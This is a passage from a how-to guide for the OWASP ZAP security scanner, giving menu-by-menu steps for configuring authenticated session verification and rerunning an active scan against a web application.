    - however, in order to enable zap to validate if it is still running or active, you can follow the below steps:
        - select one of the script resources that can only be accessed when zap is logged in from the "sites" tab
        - select "the text that corresponds to logout link"
        - right click the selected text
        - select "flag as context"
        - select the "authentication logged-in indicator"
        - follow the below steps to direct zap when it should verify/validate the logged-in session:
            - double click on context
            - select "authentication"
            - select "poll the specified url" under "verification strategy"
            - select the url to poll for
            - select "ok" button at the bottom.
#### to rerun zap to scan the application at any time, follow the below steps:
- go to "tools"
- select "active scans"
- select "context"
- select "user"
- select "start scan" button at the bottom

####checking api with zap






























































